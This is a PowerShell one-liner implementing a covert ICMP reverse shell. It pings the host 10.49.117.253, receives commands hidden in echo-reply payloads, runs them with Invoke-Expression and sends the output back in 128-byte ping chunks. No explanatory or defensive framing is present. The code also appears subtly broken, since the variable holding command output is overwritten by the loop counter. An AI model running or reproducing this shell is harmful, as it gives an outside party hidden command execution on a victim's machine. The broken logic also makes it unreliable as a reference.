$a=128;sal n new-object;sal o out-null;function gb($b){([text.encoding]::ascii).getbytes($b);};$c=n system.net.networkinformation.ping;$d=n system.net.networkinformation.pingoptions;$d.dontfragment=1;function sd($b){$c.send('10.49.117.253',60*1000,$b,$d);};sd(gb("ps $((gl).path)>"))|o;while(1){$g=sd(gb(" "));if($g.buffer){$i=gb((iex(([text.encoding]::ascii).getstring($g.buffer))2>&1|out-string));$i=0;if($i.length -gt $a){while($i -lt ([math]::floor($i.length/$a))){$o = $i[($i*$a)..(($i+1)*$a-1)];sd($o)|o;$i +=1;}if(($i.length % $a) -ne 0){$o=$i[($i*$a)..($i.length)];sd($o)|o;}}else{sd($i)|o;};sd(gb("`nps $((gl).path)>"))|o;}else{sleep 5;}}